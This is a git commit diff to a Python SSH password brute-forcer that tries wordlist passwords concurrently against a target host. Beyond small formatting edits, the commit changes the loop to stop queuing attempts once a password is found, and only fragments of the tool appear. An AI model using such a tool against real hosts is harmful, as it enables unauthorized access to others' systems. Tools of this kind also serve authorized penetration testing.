0c5bee01f9e3f5f46f2815565a62735cd0e992d8
Yash Srivastava <74751675+calc1f4r@users.noreply.github.com>
2023-07-08 17:08:32 +0530

    Update async-ssh-bruteforcer.py

--- async-ssh-bruteforcer.py
+++ async-ssh-bruteforcer.py
@@ -1,7 +1,6 @@
 import asyncio
 import asyncssh
 import argparse
-
 from termcolor import colored
 from datetime import datetime
 from os import path
@@ -9,7 +8,7 @@ from sys import exit
 
 
 def get_args():
-    """Function to get command-line arguments"""
+    """ Function to get command-line arguments """
     parser = argparse.ArgumentParser()
     parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
     parser.add_argument('-p', '--port', dest='port', default=22,
@@ -37,7 +36,7 @@ async def ssh_bruteforce(hostname, username, password, port, found_flag):
 
 
 async def main(hostname, port, username, wordlist):
-    """The Main function takes hostname,port,username,wordlist Defines concurrency limit and sends taks to ssh_bruteforce function"""
+    """The Main function takes hostname,port, username,wordlist Defines concurrency limit and sends taks to ssh_bruteforce function"""
     tasks = []
     passwords = []
     found_flag = asyncio.Event()
@@ -50,19 +49,16 @@ async def main(hostname, port, username, wordlist):
 
     for password in passwords:
         if counter >= concurrency_limit:
-            # Wait for any ongoing download to finish before starting a new one
             await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
             tasks = []
             counter = 0
 
-        if found_flag.is_set():
-            print(password)
-
-        tasks.append(asyncio.create_task(ssh_bruteforce(
+        if not found_flag.is_set():
+            tasks.append(asyncio.create_task(ssh_bruteforce(
             hostname, username, password, port, found_flag)))
 
-        await asyncio.sleep(0.5)
-        counter += 1
+            await asyncio.sleep(0.5)
+            counter += 1
 
     await asyncio.gather(*tasks)
 
